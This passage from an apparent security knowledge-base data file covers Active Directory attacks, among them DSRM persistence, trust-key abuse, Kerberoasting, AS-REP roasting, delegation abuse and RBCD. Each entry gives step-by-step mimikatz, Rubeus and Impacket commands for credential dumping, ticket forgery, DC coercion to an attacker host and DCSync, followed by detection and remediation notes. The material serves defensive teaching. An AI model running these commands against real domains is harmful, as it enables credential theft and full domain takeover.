              ["2", "lsadump::sam on the DC", "DSRM (local admin) NTLM hash"],
              ["3", "Set DsrmAdminLogonBehavior = 2", "DSRM admin can log on normally"],
              ["4", "Pass-the-hash as the DSRM admin", "Durable local-admin re-entry to the DC"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Mimikatz (lsadump::sam / sekurlsa::pth)", "Dump the DSRM hash and pass-the-hash"],
              ["Sliver (registry write / execute-assembly)", "Flip the registry value and run packaged mimikatz in memory"],
              ["PEzor + Donut", "Package mimikatz into an execute-assembly-compatible payload"],
              ["Rubeus / PsExec", "Re-authenticate to the DC with the recovered credential"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "ADSecurity — DSRM persistence", url: "https://adsecurity.org/?p=1714" },
              { label: "MITRE ATT&CK — Account Manipulation (T1098)", url: "https://attack.mitre.org/techniques/T1098/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Reset the DSRM password regularly (and after any DC compromise); treat it as a Tier-0 secret.",
              "Monitor HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior for changes to 1 or 2.",
              "Alert on network/interactive logons by the DC's local Administrator (RID 500) — DSRM should not authenticate over the network.",
              "Protect DCs against SAM/LSASS dumping (LSA Protection, Credential Guard, tiered admin) so the hash cannot be extracted.",
              "Because this requires existing DA/DC access, prevention centres on stopping the DC compromise that precedes it."
            ]
          }
        ]
      },
      {
        id: "domain-trust-key-abuse",
        name: "Domain / Forest Trust Key Abuse",
        severity: "Critical",
        ref: "https://adsecurity.org/?p=1588",
        description: "The shared key of an AD trust lets an attacker forge inter-realm tickets, escalating across a domain or forest trust to the trusting side.",
        brief: "When two AD domains or forests trust each other, they share a secret — the trust key — used to sign the inter-realm tickets that let a principal from one side request access on the other. An attacker who reaches Domain Admin can extract that trust key (or the krbtgt key) and forge inter-realm TGTs, moving from a child/other domain to the parent or across a forest trust as a high-privileged principal.\n\nImpact: escalation from one domain to Enterprise Admin across a forest, or lateral movement between forests, using tickets the trusting side accepts as genuine. Classic variants — inter-realm trust tickets, cross-domain golden tickets with SID history, and abusing the trust account key — all rest on the same shared-secret weakness.",
        quickReference: [
          { label: "Dump the trust key", cmd: "lsadump::trust /patch      # or SharpKatz / DCSync the TRUST$ account" },
          { label: "Forge an inter-realm TGT", cmd: "Rubeus silverticket / kerberos::golden with the trust key + target SID" },
          { label: "Add SID history (cross-domain golden)", cmd: "golden ... /sids:<EnterpriseAdmins-SID> (parent domain)" },
          { label: "Request a service ticket cross-trust", cmd: "Rubeus asktgs -> present on the trusting resource" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. From DA, extract the trust key (or krbtgt) ", cmd: "# the inter-realm trust key is the password hash of the trust (TRUST$) account\nlsadump::trust /patch                 # mimikatz — shows in/out trust keys\nlsadump::dcsync /user:<domain>\\krbtgt # or the krbtgt key for a cross-domain golden ticket\n# via Sliver: package mimikatz/SharpKatz with PEzor -> execute-assembly" },
              { label: "2a. Intra-forest: forge a cross-domain golden ticket with SID history", cmd: "# from a child domain to the forest root: add the parent's Enterprise Admins SID\nkerberos::golden /user:Administrator /domain:child.corp.local \\\n  /sid:<child-domain-SID> /krbtgt:<child-krbtgt-hash> \\\n  /sids:<root-EnterpriseAdmins-SID> /ptt\n# the ExtraSids grants EA rights when the ticket is used at the root" },
              { label: "2b. Inter-realm: forge a trust ticket with the trust key", cmd: "# build an inter-realm TGT signed with the trust key, then ask for a service ticket on the far side\n# Rubeus:\nRubeus.exe asktgt /user:svcadmin /aes256:<hash> /opsec /ptt      # impersonate a DA first\nRubeus.exe silverticket /... (inter-realm)  ||  kerberos::golden /service:krbtgt /target:<trusted-domain>" },
              { label: "3. Request a service ticket on the trusting domain and use it", cmd: "Rubeus.exe asktgs /ticket:<referral.kirbi> /service:cifs/<target-in-trusted-domain> /ptt\n# then access the resource (ls \\\\target\\c$, PsExec, etc.) as the impersonated principal" },
              { label: "4. Reach Enterprise Admin across the forest", cmd: "# with EA-equivalent rights on the forest root (or the trusting forest),\n# DCSync/administer the target domain and pivot to its resources" }
            ]
          },
          {
            title: "Trust Abuse Variants",
            type: "table",
            columns: ["Variant", "Detail"],
            rows: [
              ["Cross-domain golden ticket", "child krbtgt + ExtraSids (parent Enterprise Admins SID) -> EA at the forest root"],
              ["Inter-realm trust ticket", "Forge a TGT signed with the trust key -> request service tickets on the trusting domain"],
              ["Trust account (TRUST$) key", "Same key both sides share; extract it to sign inter-realm referrals"],
              ["SID filtering dependency", "External/forest trusts with SID filtering disabled let injected SIDs survive the boundary"],
              ["krbtgt of the trusted domain", "If obtained, a full golden ticket in that domain"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reach Domain Admin in one domain", "Access to DC secrets"],
              ["2", "Extract the trust key / krbtgt", "Material to sign inter-realm tickets"],
              ["3", "Forge a trust ticket / golden + SID history", "A ticket the trusting side accepts"],
              ["4", "Request service tickets across the trust", "Access / EA on the trusting domain"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Mimikatz / SharpKatz", "Extract trust keys (lsadump::trust) and krbtgt; forge golden/trust tickets"],
              ["Rubeus", "asktgt / silverticket / asktgs — forge and request inter-realm tickets"],
              ["Impacket (ticketer / raiseChild)", "Automate cross-domain golden tickets and child-to-parent escalation"],
              ["Sliver (execute-assembly + PEzor)", "Run Rubeus / packaged mimikatz in memory during the operation"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "ADSecurity — Sneaky persistence via trusts / trust keys", url: "https://adsecurity.org/?p=1588" },
              { label: "The Hacker Recipes — Forest/Domain trusts", url: "https://www.thehacker.recipes/ad/movement/trusts" },
              { label: "MITRE ATT&CK — SID-History Injection (T1134.005)", url: "https://attack.mitre.org/techniques/T1134/005/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enable SID filtering / selective authentication on external and forest trusts so injected SIDs (SID history) do not cross the boundary.",
              "Treat every domain in a forest as a single trust/security boundary — the forest, not the domain, is the true boundary; compromise of one domain endangers all.",
              "Protect and rotate krbtgt and trust account keys after any DC compromise (rotate krbtgt twice).",
              "Harden and monitor DCs against DCSync and LSASS/trust-key extraction (see AD ACL Abuse, DCSync).",
              "Alert on anomalous inter-realm TGS requests and tickets with unexpected ExtraSids/long lifetimes."
            ]
          }
        ]
      },

      {
        id: "kerberoasting-vuln",
        name: "Kerberoasting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1558/003/",
        theory: "theory/2026-08-18-kerberos.html",
        description: "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords — often a direct path to high privilege.",
        brief: "Kerberos issues a service ticket (TGS) to any authenticated user who asks for a given Service Principal Name, and the ticket is encrypted with the target service account's password-derived key. Kerberoasting requests those tickets and cracks them offline. No elevated privilege is needed and the request is indistinguishable from normal Kerberos traffic.\n\nImpact: service accounts are frequently over-privileged (sometimes Domain Admins) with weak, never-rotated passwords, so one cracked ticket can jump straight to high privilege.",
        quickReference: [
          { label: "Enumerate roastable accounts (LDAP filter)", cmd: "(&(objectClass=user)(servicePrincipalName=*))" },
          { label: "Request tickets — Impacket (Linux)", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -outputfile hashes.kerberoast" },
          { label: "Request tickets — Rubeus (Windows)", cmd: "Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast" },
          { label: "Crack offline", cmd: "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate accounts that have an SPN (from any domain user)", cmd: "# Impacket lists them and can request in one go\nGetUserSPNs.py -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   corp.local/jdoe:Passw0rd  -> any valid domain credential\n#   the output lists sAMAccountName + SPN of every service account" },
              { label: "2. Request the TGS tickets and dump the crackable hashes", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' \\\n  -outputfile hashes.kerberoast\n#   -request        actually asks the KDC for a TGS per SPN\n#   -outputfile     writes the $krb5tgs$ hashes ready for hashcat\n# Target one account instead of all:\n#   -request-user svc_sql" },
              { label: "3. Prefer RC4 tickets — they crack orders of magnitude faster than AES", cmd: "# Rubeus can force RC4 (etype 23) and filter for likely-weak accounts\nRubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.kerberoast\n#   /rc4opsec  request RC4 only where it won't downgrade an AES-only account (quieter)\n#   /nowrap    keep each hash on one line for hashcat" },
              { label: "4. Crack offline (no traffic to the target)", cmd: "hashcat -m 13100 hashes.kerberoast rockyou.txt -r rules/best64.rule\n#   -m 13100   Kerberoast (TGS-REP) mode\n# a hit gives the service account's cleartext password" },
              { label: "5. Targeted Kerberoast — add an SPN to a user you can write to, then roast it", cmd: "# needs GenericWrite/GenericAll over the target (see Dangerous AD ACLs)\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v 'fake/svc'\nGetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -request-user svc_target\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v ''  # clean up" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Authenticate with any domain user", "Foothold to send Kerberos requests"],
              ["2", "LDAP-query accounts with servicePrincipalName set", "List of roastable service accounts"],
              ["3", "Send TGS-REQ for each SPN (RC4 preferred)", "TGS-REP encrypted with the account's key"],
              ["4", "Crack the $krb5tgs$ hash offline", "Service account cleartext password"],
              ["5", "Authenticate as the service account", "Its privileges — frequently local admin or DA"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket GetUserSPNs.py", "Enumerate and request TGS tickets from Linux"],
              ["Rubeus", "Request/roast from a domain-joined Windows host, RC4 opsec"],
              ["NetExec", "--kerberoasting one-liner across the domain"],
              ["hashcat / John", "Offline cracking (mode 13100)"],
              ["bloodyAD / PowerView", "Write an SPN for targeted Kerberoasting"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1558.003 — Kerberoasting", url: "https://attack.mitre.org/techniques/T1558/003/" },
              { label: "HackingArticles — Deep dive into Kerberoasting", url: "https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" },
              { label: "The Hacker Recipes — Kerberoast", url: "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use Group Managed Service Accounts (gMSA/dMSA) — the DC manages a 120+ character password automatically, making cracking infeasible.",
              "Where gMSA is not possible, enforce 25+ character random passwords on service accounts.",
              "Enforce AES-only Kerberos to remove the fast RC4 cracking path (msDS-SupportedEncryptionTypes).",
              "Apply least privilege to service accounts so a crack has minimal blast radius; never make a service account a Domain Admin.",
              "Detect: event 4769 RC4 ticket-request spikes from one account; deploy a honeypot SPN account that no legitimate service uses."
            ]
          }
        ]
      },
      {
        id: "asrep-roasting-vuln",
        name: "AS-REP Roasting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1558/004/",
        theory: "theory/2026-08-18-kerberos.html",
        description: "Accounts with Kerberos pre-authentication disabled hand out crackable AS-REP material — obtainable with only a username list, no credentials.",
        brief: "Normal Kerberos requires pre-authentication: the client proves it knows the password before the KDC issues anything. When 'do not require pre-authentication' is set on an account, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline.\n\nImpact: with a valid credential you enumerate these accounts over LDAP; with only a username list you can request AS-REPs unauthenticated — so this can produce a first crackable credential from nothing but a name list.",
        quickReference: [
          { label: "Find pre-auth-disabled accounts (LDAP filter)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
          { label: "With creds — enumerate + roast", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt" },
          { label: "No creds — from a username list", cmd: "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10" },
          { label: "Crack", cmd: "hashcat -m 18200 asrep.txt rockyou.txt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. (No credentials) Build a username list, then request AS-REPs", cmd: "# usernames from OSINT, doc metadata, or a naming convention\nGetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt\n#   corp.local/     domain, empty user (the AS-REQ itself needs no auth)\n#   -no-pass        do not attempt a password\n#   any account with pre-auth off returns a $krb5asrep$ hash" },
              { label: "2. (With a credential) Enumerate the vulnerable accounts directly", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\n# or query LDAP for the DONT_REQ_PREAUTH bit:\n#   (userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
              { label: "3. Rubeus equivalent from a domain host", cmd: "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt" },
              { label: "4. Crack offline", cmd: "hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule\n#   -m 18200   Kerberos 5 AS-REP (etype 23)" },
              { label: "5. Targeted AS-REP roast — if you can write UAC on a target", cmd: "# with GenericWrite over the account, flip pre-auth off, roast, flip back\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local add uac svc_target -f DONT_REQ_PREAUTH\nGetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local remove uac svc_target -f DONT_REQ_PREAUTH" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain a username list (OSINT) or a domain credential", "Candidates to test / ability to enumerate"],
              ["2", "Request AS-REP for accounts with pre-auth disabled", "$krb5asrep$ hash (no password needed)"],
              ["3", "Crack the AS-REP hash offline", "Account cleartext password"],
              ["4", "Authenticate as the account", "Foothold or privilege, depending on the account"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket GetNPUsers.py", "Enumerate/request AS-REPs (with or without creds)"],
              ["Rubeus", "asreproast from a Windows host"],
              ["Kerbrute", "Quietly confirm which usernames exist first"],
              ["hashcat / John", "Offline cracking (mode 18200)"],
              ["bloodyAD / PowerView", "Toggle DONT_REQ_PREAUTH for targeted roasting"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1558.004 — AS-REP Roasting", url: "https://attack.mitre.org/techniques/T1558/004/" },
              { label: "The Hacker Recipes — AS-REP roast", url: "https://www.thehacker.recipes/ad/movement/kerberos/asreproast" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit for and clear the DONT_REQ_PREAUTH flag everywhere; never disable Kerberos pre-authentication.",
              "If an exception is genuinely required, give the account a long random password so the AS-REP is uncrackable.",
              "Enforce AES to slow cracking where the flag cannot be removed immediately.",
              "Detect: event 4768 with pre-auth type 0 for such accounts; deploy a honeypot account with pre-auth disabled and a strong password."
            ]
          }
        ]
      },
      {
        id: "unconstrained-delegation",
        name: "Unconstrained Delegation",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/",
        theory: "theory/2026-08-18-delegation.html",
        description: "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it — coerce a DC and capture its TGT for domain compromise.",
        brief: "A computer trusted for unconstrained delegation stores the full TGT of any user who authenticates to it, so it can impersonate them anywhere. Compromise such a host — or coerce a high-value account like a domain controller into authenticating to it — and you capture that TGT.\n\nImpact: capturing a DC's TGT is effectively domain compromise. The danger is greatest when an ordinary server (not just a DC) is trusted for unconstrained delegation, because it becomes a stepping stone to the DC's identity.",
        quickReference: [
          { label: "Find unconstrained-delegation hosts (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=524288)" },
          { label: "PowerView", cmd: "Get-DomainComputer -Unconstrained -Properties dnshostname" },
          { label: "Listen for and capture inbound TGTs", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
          { label: "Coerce a DC to authenticate to your host", cmd: "printerbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate hosts trusted for unconstrained delegation", cmd: "# the TRUSTED_FOR_DELEGATION UAC bit (524288)\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname\n# BloodHound flags these too; DCs have it by design — the risk is any OTHER host that has it" },
              { label: "2. On the delegation host you control, run a capture listener", cmd: "# you need the host account's key material (own the host first, or use a computer object you created)\nkrbrelayx.py -aesKey <host_account_AES256_key>\n# it waits for inbound authentications and extracts the cached TGT" },
              { label: "3. Coerce a domain controller to authenticate to your host", cmd: "# PrinterBug (MS-RPRN) forces DC01's machine account to connect back\nprinterbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host\n# alternatives: PetitPotam (MS-EFSRPC), Coercer (sprays every method)" },
              { label: "4. Reuse the captured DC TGT to replicate secrets (DCSync)", cmd: "export KRB5CCNAME='DC01$@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass -just-dc-user krbtgt dc01.corp.local\n#   -k -no-pass   use the Kerberos ticket in KRB5CCNAME, no password\n# the krbtgt hash -> Golden Ticket -> full domain persistence" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a host with TRUSTED_FOR_DELEGATION", "Delegation-trusted target"],
              ["2", "Gain control of that host's key material", "Ability to run the capture listener"],
              ["3", "Run krbrelayx capture listener", "Waiting to receive TGTs"],
              ["4", "Coerce a DC (PrinterBug/PetitPotam) to authenticate", "DC machine-account TGT cached on your host"],
              ["5", "Reuse the DC TGT to DCSync", "krbtgt hash → domain compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerView / BloodHound", "Find unconstrained-delegation hosts"],
              ["krbrelayx.py", "Capture the TGT cached by the coerced authentication"],
              ["printerbug.py / PetitPotam / Coercer", "Force a DC to authenticate to your host"],
              ["Impacket secretsdump.py", "DCSync with the captured DC TGT"],
              ["Rubeus", "monitor/tgtdeleg on a compromised Windows delegation host"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
              { label: "dirkjanm — Exploiting unconstrained delegation", url: "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/" },
              { label: "The Hacker Recipes — Unconstrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Eliminate unconstrained delegation except where strictly required, and never on non-DC servers.",
              "Put sensitive/Tier-0 accounts in the Protected Users group or mark them 'account is sensitive and cannot be delegated' (NOT_DELEGATED).",
              "Disable the Print Spooler on DCs and patch coercion vectors to remove the trigger.",
              "Prefer resource-based constrained delegation with tight scoping over unconstrained/constrained delegation.",
              "Detect: coercion RPC calls (MS-RPRN/MS-EFSRPC) and anomalous TGT usage from non-DC hosts."
            ]
          }
        ]
      },
      {
        id: "constrained-delegation",
        name: "Constrained Delegation (S4U / Bronze Bit)",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/003/",
        theory: "theory/2026-08-18-delegation.html",
        description: "An account configured for constrained delegation with protocol transition can impersonate any user to its allowed services — and the SPN in the ticket can be swapped to reach others.",
        brief: "Constrained delegation limits an account to impersonating users only to the services listed in its msDS-AllowedToDelegateTo. Protocol transition (S4U2Self) lets it obtain a ticket to itself as ANY user — even one who never authenticated — and S4U2Proxy then converts that into a ticket to an allowed service.\n\nImpact: compromise an account with constrained delegation and you can impersonate a domain admin to its target services. Because the SPN in the S4U2Proxy ticket is plaintext, it can be rewritten (e.g. cifs → http) to reach other services on the same host. The Bronze Bit (CVE-2020-17049) removes even the 'forwardable' safeguard.",
        quickReference: [
          { label: "Find constrained-delegation accounts", cmd: "Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto" },
          { label: "Impersonate Administrator via S4U (Impacket)", cmd: "getST.py -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_web:'Passw0rd'" },
          { label: "Rubeus S4U", cmd: "Rubeus.exe s4u /user:svc_web /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/dc01 /altservice:http /ptt" },
          { label: "Bronze Bit (force forwardable)", cmd: "getST.py -spn cifs/dc01 -impersonate Administrator -force-forwardable corp.local/svc_web -hashes :<NTLM>" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Identify accounts allowed to delegate (constrained)", cmd: "# accounts with msDS-AllowedToDelegateTo set, TRUSTED_TO_AUTH_FOR_DELEGATION UAC flag\nGet-DomainUser -TrustedToAuth -Properties cn,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth -Properties cn,msds-allowedtodelegateto" },
              { label: "2. Request S4U2Self + S4U2Proxy as the impersonated user", cmd: "getST.py -spn cifs/dc01.corp.local -impersonate Administrator \\\n  corp.local/svc_web:'Passw0rd'\n#   -spn           an allowed target service (from msDS-AllowedToDelegateTo)\n#   -impersonate   the user you want a ticket as (any user, incl. Administrator)\n#   svc_web:...    the compromised delegation account\n# yields Administrator@... .ccache for cifs/dc01" },
              { label: "3. Swap the SPN — the service class in the TGS is plaintext", cmd: "Rubeus.exe s4u /user:svc_web /rc4:<NTLM_of_svc_web> \\\n  /impersonateuser:Administrator /msdsspn:cifs/dc01 /altservice:http /ptt\n#   /altservice:http  rewrite cifs -> http to reach the web service on dc01\n#   /ptt              inject the resulting ticket into the current session\n# one delegated SPN often unlocks cifs, http, host, etc. on the same host" },
              { label: "4. Bronze Bit (CVE-2020-17049) — defeat the 'not forwardable' protection", cmd: "# when the KDC withholds the Forwardable flag (e.g. Protected Users / sensitive target),\n# a known service key lets you flip it during S4U\ngetST.py -spn cifs/dc01.corp.local -impersonate Administrator -force-forwardable \\\n  corp.local/svc_web -hashes :<NTLM_of_svc_web>" },
              { label: "5. Use the ticket", cmd: "export KRB5CCNAME='Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass dc01.corp.local   # or psexec/smbexec as Administrator" }
            ]
          },
          {
            title: "How Protocol Transition Works",
            type: "table",
            columns: ["Extension", "What it does"],
            rows: [
              ["S4U2Self", "The service gets a ticket to ITSELF as any chosen user — even one who never logged in"],
              ["S4U2Proxy", "Uses that ticket to get a ticket to an allowed target service, as that user"],
              ["TRUSTED_TO_AUTH_FOR_DELEGATION", "UAC flag that lets the KDC issue a forwardable S4U2Self ticket"],
              ["Plaintext SPN", "The service name in the TGS is not integrity-protected — swap cifs↔http↔host"],
              ["Bronze Bit", "CVE-2020-17049 — forge the Forwardable flag when the KDC withholds it"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Compromise an account with constrained delegation", "S4U-capable identity + its key/NTLM"],
              ["2", "S4U2Self as Administrator", "Forwardable ticket to self as the admin"],
              ["3", "S4U2Proxy to an allowed SPN", "Service ticket to the target as Administrator"],
              ["4", "Swap the SPN service class if needed", "Reach other services on the same host"],
              ["5", "Authenticate to the target service", "Admin access — often to a DC"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerView / BloodHound", "Find constrained-delegation accounts and targets"],
              ["Impacket getST.py", "Perform S4U2Self/Proxy, including -force-forwardable (Bronze Bit)"],
              ["Rubeus", "s4u with /altservice SPN swapping and /ptt"],
              ["Impacket secretsdump / psexec", "Act on the target with the impersonation ticket"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
              { label: "The Hacker Recipes — Constrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained" },
              { label: "CVE-2020-17049 — Kerberos Bronze Bit", url: "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Minimise constrained delegation; where required, delegate to the narrowest set of specific SPNs and avoid delegating to DC services.",
              "Place Tier-0 / high-value accounts in Protected Users and mark them 'sensitive and cannot be delegated'.",
              "Patch the Bronze Bit (November 2020 updates) so the Forwardable flag cannot be forged.",
              "Rotate the keys of any account configured for delegation if compromise is suspected.",
              "Detect: S4U2Self/Proxy activity (event 4769) for privileged users from delegation accounts."
            ]
          }
        ]
      },
      {
        id: "rbcd",
        name: "Resource-Based Constrained Delegation (RBCD)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1134/",
        theory: "theory/2026-08-18-delegation.html",
        description: "Write access to a computer object lets an attacker configure delegation onto it and impersonate any user to that host — often achievable from a plain foothold.",
        brief: "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Write that attribute — through an ACL you hold or a relayed LDAP session — pointing it at an account you control, then impersonate any user to the target.\n\nImpact: because a normal user can create computer accounts by default (MachineAccountQuota = 10), and write access to a computer object is common, the whole chain is frequently achievable from a low-privilege foothold, ending in full takeover of the target host.",
        quickReference: [
          { label: "Create a computer account you control", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
          { label: "Write RBCD on the target", cmd: "rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
          { label: "Impersonate Administrator to the target", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:'Pass123!'" },
          { label: "Set up via NTLM relay instead", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm you can write the target computer's attributes", cmd: "# BloodHound: GenericWrite / GenericAll / WriteAccountRestrictions over TARGET$\n# any of these lets you write msDS-AllowedToActOnBehalfOfOtherIdentity" },
              { label: "2. Create a controlled account with an SPN (a computer account has one)", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   MachineAccountQuota (default 10) lets any user create up to 10 of these" },
              { label: "3. Point the target's RBCD attribute at your account", cmd: "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   writes msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ to trust EVIL$" },
              { label: "4. Impersonate a privileged user to the target via S4U", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator \\\n  corp.local/EVIL$:'Pass123!'\n#   -spn cifs/target   the service on the target you want\n#   -impersonate       any user, e.g. Administrator\n# yields Administrator@cifs_target.ccache" },
              { label: "5. Use it", cmd: "export KRB5CCNAME='Administrator@cifs_target.corp.local@CORP.LOCAL.ccache'\npsexec.py -k -no-pass target.corp.local   # SYSTEM shell on the target" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Gain write over a computer object (ACL or relay)", "Ability to set RBCD on the target"],
              ["2", "Create/own an account with an SPN", "Principal that can be delegated from"],
              ["3", "Write msDS-AllowedToActOnBehalfOfOtherIdentity", "Target now trusts your account to delegate"],
              ["4", "S4U2Self + S4U2Proxy as Administrator", "Service ticket to the target as admin"],
              ["5", "PsExec / secretsdump to the target", "SYSTEM on the host"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket addcomputer.py", "Create a controlled computer account"],
              ["Impacket rbcd.py / bloodyAD", "Write the RBCD attribute on the target"],
              ["Impacket getST.py", "S4U impersonation to obtain the ticket"],
              ["ntlmrelayx.py", "--delegate-access to configure RBCD via a relayed LDAP session"],
              ["BloodHound", "Find write access over computer objects"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Kerberos Delegation (RBCD)", url: "https://hadess.io/" },
              { label: "Elad Shamir — Wagging the Dog (RBCD)", url: "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" },
              { label: "The Hacker Recipes — RBCD", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set MachineAccountQuota to 0 so ordinary users cannot create the computer account the chain needs.",
              "Audit and tighten ACLs on computer objects; GenericWrite/GenericAll for non-admins is the enabling condition.",
              "Enforce LDAP signing and channel binding to close the relay route into RBCD setup.",
              "Place Tier-0 accounts in Protected Users to limit impersonation.",
              "Detect: writes to msDS-AllowedToActOnBehalfOfOtherIdentity (event 5136) and new computer accounts created by user principals."
            ]
          }
        ]
      },
      {
        id: "adcs-esc",
        name: "AD CS Template Abuse (ESC1–ESC8)",
        severity: "Critical",
        ref: "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
